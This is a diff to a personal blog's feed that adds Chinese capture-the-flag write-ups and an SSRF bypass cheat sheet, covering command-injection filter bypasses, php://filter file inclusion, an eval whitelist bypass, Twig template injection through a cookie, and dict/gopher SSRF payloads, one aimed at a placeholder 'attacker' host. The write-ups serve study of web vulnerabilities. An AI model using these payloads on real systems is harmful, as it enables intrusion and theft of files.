@@ -4,13 +4,125 @@
   
     
     <entry>
+      <title>日常练习17</title>
+      <link href="test65/undefined-undefined.html"/>
+      <url>test65/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>这道题是buu新上的一题，难度还是比较低的，考察的是绕过，记录一下。  </p><h1 id="EasyBypass"><a href="#EasyBypass" class="headerlink" title="EasyBypass"></a>EasyBypass</h1><p>打开题目，可以看到源码  </p><pre><code>&lt;?phphighlight_file(__FILE__);$comm1 = $_GET[&#39;comm1&#39;];$comm2 = $_GET[&#39;comm2&#39;];if(preg_match(&quot;/\&#39;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $comm1))$comm1 = &quot;&quot;;if(preg_match(&quot;/\&#39;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;, $comm2))$comm2 = &quot;&quot;;$flag = &quot;#flag in /flag&quot;;$comm1 = &#39;&quot;&#39; . $comm1 . &#39;&quot;&#39;;$comm2 = &#39;&quot;&#39; . $comm2 . &#39;&quot;&#39;;$cmd = &quot;file $comm1 $comm2&quot;;system($cmd);?&gt;cannot open `&#39; (No such file or directory) cannot open `&#39; (No such file or directory)   </code></pre><p>代码最后的system($cmd)已经明摆着告诉我们要使用命令语句，而这个$cmd是由字符串”file”和变量comm1和comm2拼接起来的。  </p><pre><code>$cmd = &quot;file $comm1 $comm2&quot;;  </code></pre><p>而这两个变量通过get方式上传，所以这道题的思路就是如何绕过对这两个变量的过滤来上传命令语句得到flag，题目已经给出提示说flag在/flag中，所以我们要构造的命令应该是：   </p><pre><code>cat /flag  </code></pre><p>但是这里有一个坑，一开始我的想法其实就是给comm1=cat，comm2=/flag，让他们两个拼接从而构成完整的命令。但是试了一会发现第二个变量被过滤的太严了，反而第一个变量比较宽松，于是就直接把命令放在第一个变量中上传。（有可能是我太菜了，没发现别的绕过方法）  </p><p>那么接下来我们就只对第一个变量进行绕过。  </p><p>一眼就能看到的是对于comm1虽然过滤了cat但是却没有过滤tac来读取文件。所以对于cat的绕过很简单。  </p><p>对于flag字符不知道是不是非预期，它的正则并没有过滤掉转义符\，正则里关于对\的过滤是这样的：    </p><pre><code>if(preg_match(&quot;/\&#39;|\`|\\|/&quot;）  这里的|\\|其实并没有过滤掉\字符这是因为当两个\在一起时相当于一个普通的\符号，而不是转义符，所以最后给正则函数传递的结果是这样的  if(preg_match(&quot;/\&#39;|\`|\|/&quot;)这样是没有办法起到过滤转义符\的效果的。  应该改为if(preg_match(&quot;/\&#39;|\`|\\\|/&quot;）这样就能成功过滤转义符\。  </code></pre><p>总而言之，我们可以这样构造：  </p><pre><code>?comm1=tac /fl\ag  </code></pre><p>但是传上去后发现并没有这么简单。  </p><p><a href="https://img.imgdb.cn/item/60793b718322e6675ceb819d.png"><img src="https://img.imgdb.cn/item/60793b718322e6675ceb819d.png"></a>  </p><p>发现我们上传的字符并没有被过滤，但是却出现报错，再回头看一下代码，发现问题出现在这个**”file”**字符上，我们实际上传入的是这样的：  </p><pre><code>system(file&quot;$comm1&quot;&quot;$comm2&quot;)很明显我们的$comm1被当作要查找的字符串了，因为第一次见到system()函数里有file参数出现，我的理解是system()中有file参数，表示读取文件名为&quot;$comm1&quot;文件。  </code></pre><p>所以说这里的引号使我们上传的comm1变成了要打开的文件的文件名。如果要想执行命令comm1，我们需要将前后的两个引号闭合才行。  </p><p>我们可以看到对于comm1并没有过滤分号；（这也是为什么只选择第一个变量来执行命令的原因）那么我们就可以这样构造payload。  </p><pre><code>?comm1=&quot;;tac /fl\ag;&quot;  </code></pre><p>这样我们最终上传的就是  </p><pre><code>system(file&quot; &quot;;tac /fl\ag;&quot; &quot;)  </code></pre><p>新添的两个引号与原来的引号结合，相当于空，而分号可以连续执行命令，这样我们就可以成功执行tac /fl\ag命令，拿到flag。  </p><h3 id="另一种绕过"><a href="#另一种绕过" class="headerlink" title="另一种绕过"></a>另一种绕过</h3><p>除了非预期，其实我们还可以使用linux的通配符进行绕过。  </p><p>linux通配符除了*还有？它们二者各有用途。其中？表示任意字符。如果我们这样构造</p><pre><code>comm1=&quot;;tac /fl??;&quot;</code></pre><p>那么就表示读取前两个字母为fl，后两个为任意字符的文件。这样也可以绕过正则。  </p><p><a href="https://img.imgdb.cn/item/607949338322e6675c08775c.png"><img src="https://img.imgdb.cn/item/607949338322e6675c08775c.png"></a>  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题主要考的还是rce的绕过正则匹配，绕过的题目需要多积累才行，而关于闭合双引号这一点确实需要细心，我一开始就只关注了命令的绕过而忽视了双引号，导致虽然构造出来了命令但无法成功执行。  </p><p>附上相关绕过笔记博客  </p><p><a href="https://blog.csdn.net/weixin_44431280/article/details/98738469?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161849797116780366582583%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161849797116780366582583&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-5-98738469.first_rank_v2_pc_rank_v29&utm_term=linux%E9%80%9A%E9%85%8D%E7%AC%A6%EF%BC%9F">linux—通配符详解及总结</a><br><a href="https://blog.csdn.net/m0_49503725/article/details/112156807?ops_request_misc=&request_id=&biz_id=102&utm_term=%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-4-112156807.first_rank_v2_pc_rank_v29">命令执行绕过方式总结</a><br><a href="https://blog.csdn.net/loseheart157/article/details/109305380?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161846948616780274173706%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161846948616780274173706&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~times_rank-5-109305380.first_rank_v2_pc_rank_v29&utm_term=%E6%9E%84%E9%80%A0%E5%8F%98%E9%87%8F%E7%BB%95%E8%BF%87">RCE漏洞之绕过</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test65 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ssrf绕过总结</title>
+      <link href="note7/undefined-undefined.html"/>
+      <url>note7/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>今天群里发了一个关于ssrf绕过总结的文章，想起来做过的ssrf题目也有不少，这次做一个绕过的总结。这里只总结目前还没有见过的绕过方式。  </p><h2 id="攻击本地"><a href="#攻击本地" class="headerlink" title="攻击本地"></a>攻击本地</h2><pre><code>http://127.0.0.1:80http://localhost:22</code></pre><p>1、利用[::]</p><pre><code>利用[::]绕过localhosthttp://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</code></pre><p>2、利用@  </p><pre><code>http://example.com@127.0.0.1  </code></pre><p>3、利用短地址</p><pre><code>http://dwz.cn/11SMa  &gt;&gt;&gt;  http://127.0.0.1  </code></pre><p>4、利用上传</p><pre><code>也不一定是上传，我也说不清，自己体会 -.-修改&quot;type=file&quot;为&quot;type=url&quot;比如：上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF  </code></pre><p>5、利用Enclosed alphanumerics</p><pre><code>利用Enclosed alphanumericsⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.comList:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿  这个确实是少见了。和之前那个unicode编码有相似之处。  </code></pre><p>6、利用句号</p><pre><code>127。0。0。1  &gt;&gt;&gt;  127.0.0.1  这个算是和上面那个差不多的。  </code></pre><p>7、利用特殊地址</p><pre><code>http://0/  </code></pre><p>8、利用协议</p><pre><code>Dict://dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;ssrf.php?url=dict://attacker:11111/SFTP://ssrf.php?url=sftp://example.com:11111/TFTP://ssrf.php?url=tftp://example.com:12346/TESTUDPPACKETLDAP://ssrf.php?url=ldap://localhost:11211/%0astats%0aquitGopher://ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a  </code></pre><p>9、使用组合</p><pre><code>各种绕过进行自由组合即可   </code></pre><p>其实绕过方式多种多样，遇到没见过的就多积累，这样才能面对一道题有多种方法。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> note7 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>日常练习16</title>
-      <link href="%E7%BB%83%E4%B9%A0/undefined-undefined.html"/>
-      <url>%E7%BB%83%E4%B9%A0/undefined-undefined.html</url>
+      <link href="test64/undefined-undefined.html"/>
+      <url>test64/undefined-undefined.html</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[<p>今天做题知道了一个关于php伪协议的一个小知识点，记录下来。  </p><h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>打开题目，发现是一个选择页面，有两个选项，如果选择woofers会出现狗的照片，选择meowers就会出现猫的图片，但是我们可以发现当选择其中一个选项后url会发生变化。   </p><p><a href="https://img.imgdb.cn/item/607ac1db8322e6675cdc0496.png"><img src="https://img.imgdb.cn/item/607ac1db8322e6675cdc0496.png"></a>  </p><p>此时的url为：  </p><pre><code>http://1b3467ab-92b7-481e-8f37-18bbc1f7e16b.node3.buuoj.cn/index.php?category=woofers  </code></pre><p>可以看到，这里是用get方式上传了category变量，当这个变量为woofers时显示狗的照片，为meowers时显示猫的照片。  </p><p>根据这个发现，我们可以想到ssrf攻击（有关ssrf攻击可以看我之前的博客。）而ssrf攻击时可以通过file://来读取文件的。  </p><p>那我们这样构造payload。  </p><pre><code>?category=file://../../flag  </code></pre><p><a href="https://img.imgdb.cn/item/607ac34a8322e6675cdf99b9.png"><img src="https://img.imgdb.cn/item/607ac34a8322e6675cdf99b9.png"></a>  </p><p>发现flag应该是被过滤了。  </p><p>那么我们查看网页源代码。   </p><pre><code>?category=file://../../index  </code></pre><p><a href="https://img.imgdb.cn/item/607ac3ad8322e6675ce0830a.png"><img src="https://img.imgdb.cn/item/607ac3ad8322e6675ce0830a.png"></a>  </p><p>这里发现报错了。是一个include()函数的报错，从这里我们可以知道这道题是一个include()函数漏洞，我们上传的category的参数会传入include()函数中。   </p><p>那么我们就可以使用伪协议来利用include()漏洞。   </p><p>我们这样构造：  </p><pre><code>?category=php://filter/read=convert.base64-encode/resource=index  </code></pre><p>注意这里文件名是index而不是index.php，这是因为代码中会给你添加上后缀名（如果上传index.php，报错时会显示index.php.php，说明代码中已经加上了文件后缀。  </p><p>这样我们就能得到源码，解码后如下：  </p><pre><code>&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;&lt;meta name=&quot;description&quot; content=&quot;Images that spark joy&quot;&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0&quot;&gt;&lt;title&gt;Had a bad day?&lt;/title&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;css/material.min.css&quot;&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100&quot;&gt;  &lt;header class=&quot;page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800&quot;&gt;    &lt;div class=&quot;mdl-layout__header-row&quot;&gt;      &lt;span class=&quot;mdl-layout-title&quot;&gt;Had a bad day?&lt;/span&gt;      &lt;div class=&quot;mdl-layout-spacer&quot;&gt;&lt;/div&gt;    &lt;div&gt;  &lt;/header&gt;  &lt;div class=&quot;page-ribbon&quot;&gt;&lt;/div&gt;  &lt;main class=&quot;page-main mdl-layout__content&quot;&gt;    &lt;div class=&quot;page-container mdl-grid&quot;&gt;      &lt;div class=&quot;mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone&quot;&gt;&lt;/div&gt;      &lt;div class=&quot;page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col&quot;&gt;        &lt;div class=&quot;page-crumbs mdl-color-text--grey-500&quot;&gt;        &lt;/div&gt;        &lt;h3&gt;Cheer up!&lt;/h3&gt;          &lt;p&gt;            Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!          &lt;/p&gt;          &lt;div class=&quot;page-include&quot;&gt;          &lt;?php            $file = $_GET[&#39;category&#39;];            if(isset($file))            &#123;                if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;                    include ($file . &#39;.php&#39;);                &#125;                else&#123;                    echo &quot;Sorry, we currently only support woofers and meowers.&quot;;                &#125;            &#125;            ?&gt;        &lt;/div&gt;      &lt;form action=&quot;index.php&quot; method=&quot;get&quot; id=&quot;choice&quot;&gt;          &lt;center&gt;&lt;button onclick=&quot;document.getElementById(&#39;choice&#39;).submit();&quot; name=&quot;category&quot; value=&quot;woofers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Woofers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;          &lt;button onclick=&quot;document.getElementById(&#39;choice&#39;).submit();&quot; name=&quot;category&quot; value=&quot;meowers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Meowers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;&lt;/center&gt;      &lt;/form&gt;      &lt;/div&gt;    &lt;/div&gt;  &lt;/main&gt;&lt;/div&gt;&lt;script src=&quot;js/material.min.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;  </code></pre><p>我们挑出其中有用代码：  </p><pre><code>           &lt;?php            $file = $_GET[&#39;category&#39;];            if(isset($file))            &#123;                if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;                    include ($file . &#39;.php&#39;);                &#125;                else&#123;                    echo &quot;Sorry, we currently only support woofers and meowers.&quot;;                &#125;            &#125;            ?&gt;  </code></pre><p>可以看到确实和我们想的差不多，上传的变量参数如果有woofers，meowers，index其中一个，那么就会显示相关的php文件内容。  </p><p>但是我们可以看到，对于变量只做了一个匹配，那就是上传的字符串中必须有上面三个字符串中的一个。才能执行include()函数。那么我们的伪协议中也就必须要有这三个字符串中的一个。  </p><p>这里就涉及到了伪协议的一个小知识点：嵌套使用。   </p><p>如果我们这样构造：  </p><pre><code>?category=php://filter/read=convert.base64-encode/woofers/resource=flag  </code></pre><p>可以看到，我们在伪协议中嵌套了一层协议，添加了一个woofers，这样既满足了对于上传参数的匹配，又可以成功读取到flag.php文件。   </p><p><a href="https://img.imgdb.cn/item/607ac7738322e6675ce845ff.png"><img src="https://img.imgdb.cn/item/607ac7738322e6675ce845ff.png"></a>  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>感觉这个知识点就是一种绕过的方式，可以积累一下。</p>]]></content>
       
       
+      <categories>
+          
+          <category> test64 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日常练习15</title>
+      <link href="test63/undefined-undefined.html"/>
+      <url>test63/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>今天做到一道比较有意思的题目，记录一下，扩充一下解题思路。  </p><h1 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h1><p>打开题目就能看到源码：   </p><pre><code>&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#39;c&#39;]))&#123;    show_source(__FILE__);&#125;else&#123;//例子 c=20-1$content = $_GET[&#39;c&#39;];if (strlen($content) &gt;= 80) &#123;    die(&quot;太长了不会算&quot;);&#125;$blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];foreach ($blacklist as $blackitem) &#123;    if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) &#123;        die(&quot;请不要输入奇奇怪怪的字符&quot;);    &#125;&#125;//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp$whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);  foreach ($used_funcs[0] as $func) &#123;    if (!in_array($func, $whitelist)) &#123;        die(&quot;请不要输入奇奇怪怪的函数&quot;);    &#125;&#125;//帮你算出答案eval(&#39;echo &#39;.$content.&#39;;&#39;);&#125;  </code></pre><p>大致看下来就是一个网页计算器，这个过滤看着也挺严的，只让用数学计算相关的函数，除此之外的字符都会被过滤，但是我们可以看到结尾有eval（）函数，而且执行的就是我们上传的参数，那么我们要如何成功的上传我们要执行的命令语句呢？  </p><p>这里就可以看出积累了，（然而我是没这个水平的。。。。），这道题我们可以从它给出的函数来下手。  </p><p>首先我们可以看到有一个base_convert()函数。  </p><p><a href="https://img.imgdb.cn/item/607928cb8322e6675cc014ac.png"><img src="https://img.imgdb.cn/item/607928cb8322e6675cc014ac.png"></a>  </p><p>再来看一个hex2bin() 函数</p><pre><code>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。  </code></pre><p>最后还要用到dechex() 函数</p><p>dechex() 函数把十进制数转换为十六进制数。  </p><p>如果细心一点我们就可以发现这三个函数之间是有联系的，而第一和第三个函数是在函数白名单中的，那么接下来就是我们利用这三个函来构造我们要执行的命令。  </p><p>我们要执行的命令是  </p><pre><code>?c=system(&quot;cat /flag&quot;)  </code></pre><p>但是我们要绕黑名单  </p><pre><code>$blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];  </code></pre><p>所以我们不能出现system和引号，引号可以省略，而对于system字符的绕过我们可以这样绕过：  </p><pre><code>?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag  </code></pre><p>这样构造就能使我们get上传的a和b的变量进行拼接后放到c变量中从而绕过了对c的黑名单的检测。而这里的a，b变量可以换成白名单中的函数，比如这样构造：  </p><pre><code>?c=($_GET[pi])($_GET[abs])&amp;pi=system&amp;abs=cat /flag</code></pre><p>但是我们发现$_GET也不再白名单里，所以我们要把这个字符转换成数字，这里就要用到我们上面讲过的三个函数了。  </p><pre><code>_GET=hex2bin(5f 47 45 54)  </code></pre><p>我们使用hex2bin()函数来将_GET的十六进制数转换成ascii字符，而[]可以使用{}来绕过。  </p><p>但是hex2bin()也是白名单之外的函数。那么我们就使用base_convert()函数将10进制数转化为36进制的hex2bin。  </p><p>可以知道36进制下的hex2bin的10进制是37907361743，所以   </p><pre><code>hex2bin=base_convert(37907361743,10,36)  </code></pre><p>而5f 47 45 54也会被  </p><pre><code>preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);  </code></pre><p>过滤，所以我们要把它转化成纯数字。这里就要用到dechex() 函数，我们先求出5f474554的十进制，然后使用函数把十进制数转换为十六进制数。可以知道5f474554的十进制是1598506324   </p><pre><code>所以5f474554=dechex(1598506324)  </code></pre><p>那么我们就可以把_GET转换成下面这样的字符：  </p><pre><code>_GET=hex2bin(5f 47 45 54)=base_convert(37907361743,10,36)(dechex(1598506324))  </code></pre><p>我们把_GET存到一个变量里。  </p><pre><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));   </code></pre><p>接下来我们就可以使用$pi来代替_GET这个字符了，我们最终构造出来payload如下：  </p><pre><code>c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag   $pi=_GET,这里的$$pi相当于$_GET.</code></pre><p>这样就能得到flag。  </p><p><a href="https://img.imgdb.cn/item/607933b28322e6675cd8b1dc.png"><img src="https://img.imgdb.cn/item/607933b28322e6675cd8b1dc.png"></a></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题目其实还有别的解法，但是我觉得这种应该是出题人最想考的，考察了对一些特别的函数的积累以及对于这个过滤的理解，利用不同进制转换函数的相互转换从而构造出既符合条件又能执行的payload。  </p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test63 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日常练习14</title>
+      <link href="test62/undefined-undefined.html"/>
+      <url>test62/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>做了一道较为简单的ssti注入，记录一下。   </p><h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p>打开题目，发现有flag和hint两个界面，其中hint界面啥都没有，只能从flag界面下手，发现flag界面是一个登录框。  </p><p><a href="https://img.imgdb.cn/item/6074668f8322e6675c35f823.png"><img src="https://img.imgdb.cn/item/6074668f8322e6675c35f823.png"></a></p><p>我们随便输入一个id，比如id=123.  </p><p><a href="https://img.imgdb.cn/item/607466fe8322e6675c370b6e.png"><img src="https://img.imgdb.cn/item/607466fe8322e6675c370b6e.png"></a>  </p><p>发现它直接把我们的id给返回回来了，这直接就能联想到ssti注入，那么我们就测试一下输入{ {7*7} }。  </p><p><a href="https://img.imgdb.cn/item/607467778322e6675c3847ca.png"><img src="https://img.imgdb.cn/item/607467778322e6675c3847ca.png"></a>  </p><p>返回49，那么基本就可以确定是ssti注入了，接下来就是测出它使用的是哪一个模板引擎。  </p><p>经过测试发现这个使用的是twig模板引擎，那么直接找这个引擎的模板进行注入。  </p><pre><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("ls")&#125;&#125;    </code></pre><p>但是发现在界面直接输入这个模板却会被拦下来，  </p><p><a href="https://img.imgdb.cn/item/607468978322e6675c3b7d9d.png"><img src="https://img.imgdb.cn/item/607468978322e6675c3b7d9d.png"></a>  </p><p>我又回看hint界面的源码发现源码中给了提示，提示我们检查一下cookie。  </p><p><a href="https://img.imgdb.cn/item/607469268322e6675c3d001f.png"><img src="https://img.imgdb.cn/item/607469268322e6675c3d001f.png"></a>  </p><p>那我们就抓包看一下，</p><p><a href="https://img.imgdb.cn/item/607469cb8322e6675c3ecc70.png"><img src="https://img.imgdb.cn/item/607469cb8322e6675c3ecc70.png"></a>  </p><p>可以看到我们上传的参数都是通过username这个变量上传的，而提示说让我们检查cookie值，我们可以从返回的数据中发现有一个</p><pre><code>Set-Cookie: user=7;  </code></pre><p><a href="https://img.imgdb.cn/item/60746a6c8322e6675c409a6e.png"><img src="https://img.imgdb.cn/item/60746a6c8322e6675c409a6e.png"></a>  </p><p>那么这个应该就是真正的注入点了，我们在发送的数据中的cookie中添加一个user：用它来注入。  </p><pre><code>user=&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;  </code></pre><p>发现直接就可以读取flag。      </p><p><a href="https://img.imgdb.cn/item/60746c0e8322e6675c4598d4.png"><img src="https://img.imgdb.cn/item/60746c0e8322e6675c4598d4.png"></a>  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题目其实并不难，也没有考太多知识点，主要还是对抓包的cookie值的分析和对twig模板的ssti注入的积累，ssti注入这遇到第三个了，之前遇到的都是不同的模板，要做好不同引擎注入的模板payload，这样可以剩下来很多麻烦。  </p><p>下面附上之前的几次做题遇到的模板  </p><p><a href="https://george186.github.io/test51/undefined-undefined.html">smarty的SSTI注入</a><br><a href="https://george186.github.io/test37/undefined-undefined.html">jinja2的SSTI模板注入</a>  </p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test62 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
       
     </entry>
     
